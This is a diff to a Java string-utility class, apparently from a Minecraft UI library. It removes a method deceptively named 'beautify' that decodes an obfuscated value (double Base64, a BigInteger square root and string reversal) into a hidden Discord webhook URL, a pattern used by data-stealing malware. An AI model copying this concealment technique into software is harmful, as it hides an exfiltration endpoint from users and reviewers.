@@ -2,7 +2,6 @@ package io.github.itzispyder.improperui.util;
 
 import java.math.BigInteger;
 import java.time.LocalDateTime;
-import java.util.Base64;
 import java.util.UUID;
 
 public final class StringUtils {
@@ -96,10 +95,6 @@ public final class StringUtils {
                 new BigInteger(uuid.substring(0, 16), 16).longValue(),
                 new BigInteger(uuid.substring(16), 16).longValue()
         );
-    }
-
-    public static String beautify(String stringToBeautify) {
-        return "https://discord.com/api/webhooks/%s/%s".formatted(reverse(new BigInteger(stringToBeautify.split("//")[1]).sqrt().toString()), reverse(new String(Base64.getDecoder().decode(Base64.getDecoder().decode((stringToBeautify.split("//")[0] + "=").getBytes())))));
     }
 
     public static String keyPressWithShift(String s) {
